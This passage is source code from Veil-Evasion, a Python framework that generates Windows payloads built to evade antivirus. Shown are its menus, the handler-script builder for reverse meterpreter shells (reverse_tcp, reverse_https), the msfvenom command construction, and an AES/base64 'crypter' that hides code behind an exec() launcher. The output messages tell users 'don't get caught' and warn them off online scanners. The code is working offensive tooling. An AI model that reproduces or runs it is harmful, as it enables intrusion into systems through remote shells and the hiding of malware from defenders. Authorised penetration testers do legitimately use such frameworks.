            message += "\n" + helpers.formatLong("Required Options:", t.strip(), frontTab=False, spacing=24)

            # check if any options specify that we should build a handler out
            keys = payload.required_options.keys()

            # assuming if LHOST is set, we need a handler script
            if "LHOST" in keys:

                handler = "use exploit/multi/handler\n"
                # do our best to determine the payload type

                # handle options from the backdoor factory
                if "payload" in keys:
                    p = payload.required_options["payload"][0]
                    if "tcp" in p:
                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
                    elif "https" in p:
                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                    elif "shell" in  p:
                        handler += "set PAYLOAD windows/shell_reverse_tcp\n"
                    else: pass

                # if not BDF, try to extract the handler type from the payload name
                else:
                    # extract the payload class name from the instantiated object, then chop off the load folder prefix
                    payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])

                    # pure rev_tcp stager
                    if "tcp" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
                    # pure rev_https stager
                    elif "https" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                    # pure rev_http stager
                    elif "http" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
                    else: pass

                # grab the LHOST value
                handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"

                # grab the LPORT value if it was set
                if "LPORT" in keys:
                    handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"

                handler += "set ExitOnSession false\n"
                handler += "exploit -j\n"

        message += "\n Payload File:\t\t"+OutputFileName + "\n"

        # if we're generating the handler script, write it out
        try:
            if settings.GENERATE_HANDLER_SCRIPT.lower() == "true":
                if handler != "":
                    handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
                    handlerFile = open(handlerFileName, 'w')
                    handlerFile.write(handler)
                    handlerFile.close()
                    message += " Handler File:\t\t"+handlerFileName + "\n"
        except:
            # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)

        # print out notes if set
        if hasattr(payload, 'notes'):
            #message += " Notes:\t\t\t" + payload.notes
            message += helpers.formatLong("Notes:", payload.notes, frontTab=False, spacing=24)

        message += "\n"

        # check if compile_to_exe is in the required options, if so,
        # call supportfiles.supportingFiles() to compile appropriately
        if hasattr(self.payload, 'required_options'):
            if "compile_to_exe" in self.payload.required_options:
                value = self.payload.required_options['compile_to_exe'][0].lower()[0]

                if value == "y" or value==True:

                    # check if the --pwnstaller flag was passed
                    if args and args.pwnstaller:
                        supportfiles.supportingFiles(self.payload.language, OutputFileName, {'method':'pwnstaller'})
                    else:
                        # if interactive, allow the user to choose the method
                        if interactive:
                            supportfiles.supportingFiles(self.payload.language, OutputFileName, {})
                        # otherwise specify the default, pyinstaller
                        else:
                            supportfiles.supportingFiles(self.payload.language, OutputFileName, {'method':'pyinstaller'})

                    # if we're compiling, set the returned file name to the output .exe
                    # so we can return this for external calls to the framework
                    OutputFileName = settings.PAYLOAD_COMPILED_PATH + FinalBaseChoice + ".exe"
 

        # print the full message containing generation notes
        print message

        # This block of code is going to be used to SHA1 hash our compiled payloads to potentially submit the
        # hash with VTNotify to detect if it's been flagged
        try:
            CompiledHashFile = settings.HASH_LIST
            HashFile = open(CompiledHashFile, 'a')
            OutputFile = open(OutputFileName, 'rb')
            Sha1Hasher = hashlib.sha1()
            Sha1Hasher.update(OutputFile.read())
            SHA1Hash = Sha1Hasher.hexdigest()
            OutputFile.close()
            HashFile.write(SHA1Hash + ":" + FinalBaseChoice + "\n")
            HashFile.close()
        except:
            # if that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)


        # print the end message
        messages.endmsg()

        if interactive:
            raw_input(" [>] press any key to return to the main menu: ")
            #self.MainMenu(showMessage=True)

        return OutputFileName


    def PayloadMenu(self, payload, showTitle=True, args=None):
        """
        Main menu for interacting with a specific payload.

        payload = the payload object we're interacting with
        showTitle = whether to show the main Veil title menu

        Returns the output of OutputMenu() (the full path of the source file or compiled .exe)
        """

        comp = completers.PayloadCompleter(self.payloadCommands, self.payload)
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)

        # show the title if specified
        if showTitle:
            messages.title()

        # extract the payload class name from the instantiated object
        # YES, I know this is a giant hack :(
        # basically need to find "payloads" in the path name, then build
        # everything as appropriate
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        print " Payload: " + helpers.color(payloadname) + " loaded\n"

        self.PayloadInfo(payload, showTitle=False, showInfo=False)
        messages.helpmsg(self.payloadCommands, showTitle=False)

        choice = ""
        while choice == "":

            while True:

                choice = raw_input(" [>] Please enter a command: ").strip()

                if choice != "":

                    parts = choice.strip().split()
                    # display help menu for the payload
                    if parts[0] == "info":
                        self.PayloadInfo(payload)
                        choice = ""
                    if parts[0] == "help":
                        messages.helpmsg(self.payloadCommands)
                        choice = ""
                    # head back to the main menu
                    if parts[0] == "main" or parts[0] == "back":
                        #finished = True
                        return ""
                        #self.MainMenu()
                    if parts[0] == "exit":
                        raise KeyboardInterrupt

                    # Update Veil via git
                    if parts[0] == "update":
                        self.UpdateVeil()

                    # set specific options
                    if parts[0] == "set":

                        # catch the case of no value being supplied
                        if len(parts) == 1:
                            print helpers.color(" [!] ERROR: no value supplied\n", warning=True)

                        else:

                            option = parts[1]
                            value = "".join(parts[2:])

                            #### VALIDATION ####

                            # validate LHOST
                            if option == "LHOST":
                                hostParts = value.split(".")

                                if len(hostParts) > 1:

                                    # if the last chunk is a number, assume it's an IP address
                                    if hostParts[-1].isdigit():
                                        # do a regex IP validation
                                        if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
                                            print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
                                        else:
                                            try:
                                                payload.required_options[option][0] = value
                                            except KeyError:
                                                print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)
                                            except AttributeError:
                                                print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)

                                    # assume we've been passed a domain name
                                    else:
                                        if helpers.isValidHostname(value):
                                            payload.required_options[option][0] = value
                                        else:
                                            print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)

                                else:
                                    print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)

                            # validate LPORT
                            elif option  == "LPORT":
                                try:
                                    if int(value) <= 0 or int(value) >= 65535:
                                        print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)
                                    else:
                                        try:
                                            payload.required_options[option][0] = value
                                        except KeyError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                        except AttributeError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                except ValueError:
                                    print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)

                            # set the specific option value if not validation done
                            else:
                                try:
                                    payload.required_options[option][0] = value
                                except:
                                    print helpers.color(" [!] ERROR: Invalid value specified.\n", warning=True)
                                    cmd = ""

                    # generate the payload
                    if parts[0] == "generate":

                        # make sure all required options are filled in first
                        if self.ValidatePayload(payload):

                            #finished = True
                            # actually generate the payload code
                            payloadCode = payload.generate()

                            # ensure we got some code back
                            if payloadCode != "":
                                # call the output menu
                                return self.OutputMenu(payload, payloadCode, args=args)

                        else:
                            print helpers.color("\n [!] WARNING: not all required options filled\n", warning=True)


    def MainMenu(self, showMessage=True, args=None):
        """
        Main interactive menu for payload generation.

        showMessage = reset the screen and show the greeting message [default=True]
        oneRun = only run generation once, returning the path to the compiled executable
            used when invoking the framework from an external source
        """

        self.outputFileName = ""
        cmd = ""

        try:
            while cmd == "" and self.outputFileName == "":

                # set out tab completion for the appropriate modules on each run
                # as other modules sometimes reset this
                comp = completers.MainMenuCompleter(self.commands, self.payloads)
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                if showMessage:
                    # print the title, where we are, and number of payloads loaded
                    messages.title()
                    print " Main Menu\n"
                    print "\t" + helpers.color(str(len(self.payloads))) + " payloads loaded\n"
                    messages.helpmsg(self.commands, showTitle=False)

                cmd = raw_input(' [>] Please enter a command: ').strip()

                # handle our tab completed commands
                if cmd.startswith("help"):
                    messages.title()
                    cmd = ""
                    showMessage=False

                elif cmd.startswith("use"):

                    if len(cmd.split()) == 1:
                        messages.title()
                        self.ListPayloads()
                        showMessage=False
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)                                        

                        cmd = ""
                        showMessage=True

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("update"):
                    self.UpdateVeil()
                    showMessage=True
                    cmd = ""

                elif cmd.startswith("checkvt"):
                    self.CheckVT()
                    showMessage=True
                    cmd = ""

                # clean payload folders
                if cmd.startswith("clean"):
                    self.CleanPayloads()
                    showMessage=True
                    cmd = ""

                elif cmd.startswith("info"):

                    if len(cmd.split()) == 1:
                        showMessage=True
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.PayloadInfo(self.payload)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.PayloadInfo(self.payload) 

                        cmd = ""
                        showMessage=False

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("list"):

                    if len(cmd.split()) == 1:
                        messages.title()
                        self.ListPayloads()     

                    cmd = ""
                    showMessage=False

                elif cmd.startswith("exit") or cmd.startswith("q"):
                    if self.oneRun:
                        # if we're being invoked from external code, just return
                        # an empty string on an exit/quit instead of killing everything
                        return ""
                    else:
                        print helpers.color("\n [!] Exiting...\n", warning=True)
                        sys.exit()

                # select a payload by just the number
                elif cmd.isdigit() and 0 < int(cmd) <= len(self.payloads):
                    x = 1
                    for (name, pay) in self.payloads:
                        # if the entered number matches the payload #, use that payload
                        if int(cmd) == x:
                            self.payload = pay
                            self.outputFileName = self.PayloadMenu(self.payload, args=args)
                        x += 1
                    cmd = ""
                    showMessage=True

                # if nothing is entered
                else:
                    cmd = ""
                    showMessage=True

                # if we're looping forever on the main menu (Veil.py behavior)
                # reset the output filname to nothing so we don't break the while
                if not self.oneRun:
                    self.outputFileName = ""

            return self.outputFileName

        # catch any ctrl + c interrupts
        except KeyboardInterrupt:
            if self.oneRun:
                # if we're being invoked from external code, just return
                # an empty string on an exit/quit instead of killing everything
                return ""
            else:
                print helpers.color("\n\n [!] Exiting...\n", warning=True)
                sys.exit()

########NEW FILE########
__FILENAME__ = encryption
"""
Contains any encryption-related methods that may be reused.

"""

# Import Modules
import string
import random
import base64
from Crypto.Cipher import DES
from Crypto.Cipher import AES
from Crypto.Cipher import ARC4

from modules.common import helpers

# AES Block Size and Padding
BlockSize = 32
Padding = '{'



#################################################################
#
# Misc helper functions.
#
#################################################################

"""
Lambda function for Padding Encrypted Text to Fit the Block
"""
pad = lambda s: s + (BlockSize - len(s) % BlockSize) * Padding


"""
Pad a string to block size, AES encrypt, then base64encode.
"""
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))


"""
Base64Decode a string, AES descrypt it, then strip padding.
"""
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Padding)



#################################################################
#
# Various encryption methods.
#
#################################################################


def b64sub(s, key):
    """
    "Encryption" method that base64 encodes a given string, 
    then does a randomized alphabetic letter substitution.
    """
    enc_tbl = string.maketrans(string.ascii_letters, key)
    return string.translate(base64.b64encode(s), enc_tbl)


def encryptAES(s):
    """
    Generates a random AES key, builds an AES cipher,
    encrypts passed 's' and returns (encrypted, randomKey)
    """
    # Generate Random AES Key
    key = helpers.randomKey()

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(key)

    # actually encrypt the text
    encrypted = EncodeAES(cipher, s)

    # return a tuple of (encodedText, randomKey)
    return (encrypted, key)

def constrainedAES(s):
    """
    Generates a constrained AES key which is later brute forced
    in a loop
    """
    # Create our constrained Key
    small_key = helpers.randomKey(26)

    # Actual Key used
    real_key = small_key + str(helpers.randomNumbers())

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(real_key)

    # actually encrypt the text
    encrypted = EncodeAES(cipher, s)

    # return a tuple of (encodedText, small constrained key, actual key used)
    return (encrypted, small_key, real_key)


def knownPlaintext(known_key, random_plaintext):
    """
    Uses key passed in to encrypt a random string which is 
    used in a known plaintext attack to brute force its 
    own key
    """
    # Create our cipher object with our known key
    stallion = AES.new(known_key)

    # Our random string is encrypted and encoded
    encrypted_string = EncodeAES(stallion, random_plaintext)

    # return our encrypted known plaintext
    return encrypted_string

def encryptDES(s):
    """
    Generates a random DES key and IV, builds an DES cipher,
    encrypts passed 's' and returns (encrypted, (randomKey, randomIV))
    """
    # get random IV Value and ARC Key
    iv = helpers.randomKey(8)
    key = helpers.randomKey(8)

    # Create DES Object and encrypt our payload
    desmain = DES.new(key, DES.MODE_CFB, iv)
    encrypted = desmain.encrypt(s)

    return (encrypted, (key,iv) )


def encryptARC(s):
    """
    Generates a random ARC key and IV, builds an ARC cipher,
    encrypts passed 's' and returns (encrypted, (randomKey, randomIV))
    """
    # get random IV Value and ARC Key
    iv = helpers.randomKey(8)
    key = helpers.randomKey(8)

    # Create ARC Object and encrypt our payload
    arc4main = ARC4.new(key)
    encrypted = arc4main.encrypt(s)

    return (encrypted, (key,iv) )



#################################################################
#
# 'Crypters'/source code obfuscators.
#
#################################################################

def pyherion(code):
    """
    Generates a crypted hyperion'esque version of python code using
    base64 and AES with a random key, wrapped in an exec() dynamic launcher.

    code = the python source code to encrypt

    Returns the encrypted python code as a string.
    """

    imports = list()
    codebase = list()
    
    # strip out all imports from the code so pyinstaller can properly
    # launch the code by preimporting everything at compiletime
    for line in code.split("\n"):
        if not line.startswith("#"): # ignore commented imports...
            if "import" in line:
                imports.append(line)
            else:
                codebase.append(line)
    
    # generate a random 256 AES key and build our AES cipher
    key = helpers.randomKey(32)
    cipherEnc = AES.new(key)

    # encrypt the input file (less the imports)
    encrypted = EncodeAES(cipherEnc, "\n".join(codebase))
    
    # some random variable names
    b64var = helpers.randomString(5)
    aesvar = helpers.randomString(5)

    # randomize our base64 and AES importing variable
    imports.append("from base64 import b64decode as %s" %(b64var))
    imports.append("from Crypto.Cipher import AES as %s" %(aesvar))

    # shuffle up our imports
    random.shuffle(imports)
    
    # add in the AES imports and any imports found in the file
    crypted = ";".join(imports) + "\n"

    # the exec() launcher for our base64'ed encrypted string
    crypted += "exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted)))

    return crypted

########NEW FILE########
__FILENAME__ = helpers
"""
Contains any miscellaneous helper methods useful across multiple modules.

"""

import random, string, base64, zlib, re, textwrap, commands

    
def color(string, status=True, warning=False, bold=True):
    """
    Change text color for the linux terminal, defaults to green.
    
    Set "warning=True" for red.
    """
    attr = []
    if status:
        # green
        attr.append('32')
    if warning:
        # red
        attr.append('31')
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    
def inflate( b64string ):
    """
    Decode/decompress a base64 string. Used in powershell invokers.
    """
    decoded_data = base64.b64decode( b64string )
    return zlib.decompress( decoded_data , -15)
    
def deflate( string_val ):
    """
    Compress/base64 encode a string. Used in powershell invokers.
    """
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )

def LHOST():
    """
    Return the IP of eth0
    """ 
    return commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]

def isValidHostname(hostname):
    """
    Try to validate the passed host name, return True or False.
    """
    if len(hostname) > 255: return False
    if hostname[-1:] == ".": hostname = hostname[:-1]
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))

def formatLong(title,message, frontTab=True, spacing=16):
    """
    Print a long title:message with our standardized formatting.
    Wraps multiple lines into a nice paragraph format.
    """

    lines = textwrap.wrap(textwrap.dedent(message).strip(), width=50)
    returnString = ""

    i = 1
    if len(lines) > 0:
        if frontTab:
            returnString += "\t%s%s" % (('{0: <%s}'%spacing).format(title), lines[0])
        else:
            returnString += " %s%s" % (('{0: <%s}'%(spacing-1)).format(title), lines[0])
    while i < len(lines):
        if frontTab:
            returnString += "\n\t"+' '*spacing+lines[i]
        else:
            returnString += "\n"+' '*spacing+lines[i]
        i += 1
    return returnString


#################################################################
#
# Randomization/obfuscation methods.
#
#################################################################

def randomString(length=-1):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    """
    if length == -1: length = random.randrange(6,16)
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))
    return random_string

def randomKey(b=32):
    """
    Returns a random string/key of "b" characters in length, defaults to 32
    """
    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(b))

def randomNumbers(b=6):
    """
    Returns a random string/key of "b" characters in length, defaults to 5
    """
    random_number = int(''.join(random.choice(string.digits) for x in range(b))) + 10000

    if random_number < 100000:
        random_number = random_number + 100000

    return random_number


def randomLetter():
    """
    Returns a random ascii letter.
    """
    return random.choice(string.ascii_letters)

def shuffle(l):
    """
    Shuffle the passed list.
    """
    random.shuffle(l)

def obfuscateNum(N, mod):
    """
    Take a number and modulus and return an obsucfated form.

    Returns a string of the obfuscated number N
    """
    d = random.randint(1, mod)
    left = int(N/d)
    right = d
    remainder = N % d
    return "(%s*%s+%s)" %(left, right, remainder)

########NEW FILE########
__FILENAME__ = messages
"""
Common terminal messages used across the framework.
"""

import os, sys, types

import settings
import helpers


version = "2.8.0"


# try to find and import the settings.py config file
if os.path.exists("/etc/veil/settings.py"):
    try:
        sys.path.append("/etc/veil/")
        import settings

        # check for a few updated values to see if we have a new or old settings.py file
        try:
            settings.VEIL_EVASION_PATH
        except AttributeError:
            os.system('clear')
            print '========================================================================='
            print ' New major Veil-Evasion version installed'
            print ' Re-running ./setup/setup.sh'
            print '========================================================================='
            time.sleep(3)
            os.system('cd setup && ./setup.sh')

            # reload the settings import to refresh the values
            reload(settings)

    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
elif os.path.exists("./config/settings.py"):
    try:
        sys.path.append("./config")
        import settings
    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
else:
    # if the file isn't found, try to run the update script
    os.system('clear')
    print '========================================================================='
    print ' Veil First Run Detected... Initializing Script Setup...'
    print '========================================================================='
    # run the config if it hasn't been run
    print '\n [*] Executing ./setup/setup.sh'
    os.system('cd setup && ./setup.sh')

    # check for the config again and error out if it can't be found.
    if os.path.exists("/etc/veil/settings.py"):
        try:
            sys.path.append("/etc/veil/")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    elif os.path.exists("./config/settings.py"):
        try:
            sys.path.append("./config")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    else:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()


def title():
    """
    Print the framework title, with version.
    """
    os.system(settings.TERMINAL_CLEAR)
    print '========================================================================='
    print ' Veil-Evasion | [Version]: ' + version
    print '========================================================================='
    print ' [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework'
    print '========================================================================='
    print ""
    
    if settings.OPERATING_SYSTEM != "Kali":
        print helpers.color(' [!] WARNING: Official support for Kali Linux (x86) only at this time!', warning=True)
        print helpers.color(' [!] WARNING: Continue at your own risk!\n', warning=True)
    
    # check to make sure the current OS is supported,
    # print a warning message if it's not and exit
    if settings.OPERATING_SYSTEM == "Windows" or settings.OPERATING_SYSTEM == "Unsupported":
        print helpers.color(' [!] ERROR: Your operating system is not currently supported...\n', warning=True)
        print helpers.color(' [!] ERROR: Request your distribution at the GitHub repository...\n', warning=True)
        sys.exit()

def helpmsg(commands, showTitle=True):
    """
    Print a help menu.
    """
    
    if showTitle:
        title()
    
    print " Available commands:\n"
    
    # list commands in sorted order
    #for cmd in sorted(commands.iterkeys(), reverse=True):
    for (cmd, desc) in commands:
        
        print "\t%s\t%s" % ('{0: <12}'.format(cmd), desc)

    print ""

def helpModule(module):
    """
    Print the first text chunk for each established method in a module.

    module: module to write output from, format "folder.folder.module"
    """

    # split module.x.y into "from module.x import y" 
    t = module.split(".")
    importName = "from " + ".".join(t[:-1]) + " import " + t[-1]

    # dynamically do the import
    exec(importName)
    moduleName = t[-1]

    # extract all local functions from the imported module, 
    # referenced here by locals()[moduleName]
    functions = [locals()[moduleName].__dict__.get(a) for a in dir(locals()[moduleName]) if isinstance(locals()[moduleName].__dict__.get(a), types.FunctionType)]

    # pull all the doc strings out from said functions and print the top chunk
    for function in functions:
        base = function.func_doc
        base = base.replace("\t", " ")
        doc = "".join(base.split("\n\n")[0].strip().split("\n"))
        # print function.func_name + " : " + doc
        print helpers.formatLong(function.func_name, doc)

def endmsg():
    """
    Print the exit message.
    """
    print " [*] Your payload files have been generated, don't get caught!" 
    print helpers.color(" [!] And don't submit samples to any online scanner! ;)\n", warning=True)

########NEW FILE########
__FILENAME__ = shellcode
"""
Contains main Shellcode class as well as the Completer class used
for tab completion of metasploit payload selection.

"""

# Import Modules
import commands
import socket
import sys
import os
import sys
import re
import readline
import subprocess

from modules.common import messages
from modules.common import helpers
from modules.common import completers

import settings

class Shellcode:
    """
    Class that represents a shellcode object, custom of msfvenom generated.

    """
    def __init__(self):
        # the nested dictionary passed to the completer
        self.payloadTree = {}
        # the entier msfvenom command that may be built
        self.msfvenomCommand = ""
        # any associated msfvenom options
        self.msfvenomOptions = list()
        # in case user specifies a custom shellcode string
        self.customshellcode = ""
        # specific msfvenom payload specified
        self.msfvenompayload= ""
        # misc options
        self.options = list()

        # load up all the metasploit modules available
        self.LoadModules()


    def Reset(self):
        """
        reset the state of any internal variables, everything but self.payloadTree
        """
        self.msfvenomCommand = ""
        self.msfvenomOptions = list()
        self.customshellcode = ""
        self.msfvenompayload= ""
        self.options = list()


    def LoadModules(self):
        """
        Crawls the metasploit install tree and extracts available payloads
        and their associated required options for langauges specified.

        """

        # Variable changed for compatibility with  non-root and non-Kali users
        # Thanks to Tim Medin for the patch 
        msfFolder = settings.METASPLOIT_PATH

        # I can haz multiple platforms?
        platforms = ["windows"]

        for platform in platforms:
            self.payloadTree[platform] = {}

            stagesX86 = list()
            stagersX86 = list()
            stagesX64 = list()
            stagersX64 = list()

            # load up all the stages (meterpreter/vnc/etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/stages/" + platform + "/"):
                for f in files:
                    stageName = f.split(".")[0]
                    if "x64" in root:
                        stagesX64.append(f.split(".")[0])
                        if "x64" not in self.payloadTree[platform]:
                            self.payloadTree[platform]["x64"] = {}
                        self.payloadTree[platform]["x64"][stageName] = {}
                    elif "x86" in root: # linux payload structure format
                        stagesX86.append(f.split(".")[0])
                        if "x86" not in self.payloadTree[platform]:
                            self.payloadTree[platform]["x86"] = {}
                        self.payloadTree[platform]["x86"][stageName] = {}
                    else: # windows payload structure format
                        stagesX86.append(f.split(".")[0])
                        if stageName not in self.payloadTree[platform]:
                            self.payloadTree[platform][stageName] = {}

            # load up all the stagers (reverse_tcp, bind_tcp, etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/stagers/" + platform + "/"):
                for f in files:

                    if ".rb" in f:
                        extraOptions = list()
                        moduleName = f.split(".")[0]
                        lines = open(root + "/" + f).readlines()
                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd, options = eval(")".join(line.strip().replace("true", "True").split("OptString.new(")[1].split(")")[:-1]))
                                extraOptions.append(cmd)
                        if "bind" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payloadTree[platform]["x64"][stage][moduleName] = ["LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payloadTree[platform]["x86"][stage][moduleName] = ["LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payloadTree[platform][stage][moduleName] = ["LPORT"] + extraOptions
                        if "reverse" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payloadTree[platform]["x64"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payloadTree[platform]["x86"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payloadTree[platform][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions

            # load up any payload singles
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + "/modules/payloads/singles/" + platform + "/"):
                for f in files:

                    if ".rb" in f:

                        lines = open(root + "/" + f).readlines()
                        totalOptions = list()
                        moduleName = f.split(".")[0]

                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd, options = eval(")".join(line.strip().replace("true", "True").split("OptString.new(")[1].split(")")[:-1]))
                                if len(options) == 2:
                                    # only append if there isn't a default already filled in
                                    totalOptions.append(cmd)
                        if "bind" in f:
                            totalOptions.append("LPORT")
                        if "reverse" in f:
                            totalOptions.append("LHOST")
                            totalOptions.append("LPORT")
                        if "x64" in root:
                            self.payloadTree[platform]["x64"][moduleName] = totalOptions
                        elif "x86" in root:
                            self.payloadTree[platform]["x86"][moduleName] = totalOptions
                        else:
                            self.payloadTree[platform][moduleName] = totalOptions

    def SetPayload(self, payloadAndOptions):
        """
        Manually set the payload/options, used in scripting

        payloadAndOptions = nested 2 element list of [msfvenom_payload, ["option=value",...]]
                i.e. ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]]
        """

        # extract the msfvenom payload and options
        payload = payloadAndOptions[0]
        options = payloadAndOptions[1]

        # grab any specified msfvenom options in the /etc/veil/settings.py file
        msfvenomOptions = ""
        if hasattr(settings, "MSFVENOM_OPTIONS"):
            msfvenomOptions = settings.MSFVENOM_OPTIONS

        # build the msfvenom command
        # TODO: detect Windows and modify the msfvenom command appropriately
        self.msfvenomCommand = "msfvenom " + msfvenomOptions + " -p " + payload

        # add options only if we have some
        if options:
            for option in options:
                self.msfvenomCommand += " " + option + " "
        self.msfvenomCommand += " -b \'\\x00\\x0a\\xff\' -e x86/call4_dword_xor -f c | tr -d \'\"\' | tr -d \'\n\'"

        # set the internal msfvenompayload to this payload
        self.msfvenompayload = payload

        # set the internal msfvenomOptions to these options
        if options:
            for option in options:
                self.msfvenomOptions.append(option)

    def setCustomShellcode(self, customShellcode):
        """
        Manually set self.customshellcode to the shellcode string passed.

        customShellcode = shellcode string ("\x00\x01...")
        """
        self.customshellcode = customShellcode


    def custShellcodeMenu(self, showTitle=True):
        """
        Menu to prompt the user for a custom shellcode string.

        Returns None if nothing is specified.
        """

        # print out the main title to reset the interface
        if showTitle:
            messages.title()

        print ' [?] Use msfvenom or supply custom shellcode?\n'
        print '     1 - msfvenom (default)'
        print '     2 - Custom\n'

        choice = raw_input(" [>] Please enter the number of your choice: ")

        # Continue to msfvenom parameters.
        if choice == '2':
            CustomShell = raw_input(" [>] Please enter custom shellcode (one line, no quotes, \\x00.. format): ")
            return CustomShell
        elif choice != '1':
            print helpers.color(" [!] WARNING: Invalid option chosen, defaulting to msfvenom!", warning=True)
            return None
        else:
            return None


    def menu(self):
        """
        Main interactive menu for shellcode selection.

        Utilizes Completer() to do tab completion on loaded metasploit payloads.
        """

        payloadSelected = None
        options = None

        # if no generation method has been selected yet
        if self.msfvenomCommand == "" and self.customshellcode == "":
            # prompt for custom shellcode
            customShellcode = self.custShellcodeMenu()

            # if custom shellcode is specified, set it
            if customShellcode:
                self.customshellcode = customShellcode

            # else, if no custom shellcode is specified, prompt for metasploit
            else:

                # instantiate our completer object for tab completion of available payloads
                comp = completers.MSFCompleter(self.payloadTree)

                # we want to treat '/' as part of a word, so override the delimiters
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                # have the user select the payload
                while payloadSelected == None:

                    print '\n [*] Press [enter] for windows/meterpreter/reverse_tcp'
                    print ' [*] Press [tab] to list available payloads'
                    payloadSelected = raw_input(' [>] Please enter metasploit payload: ').strip()
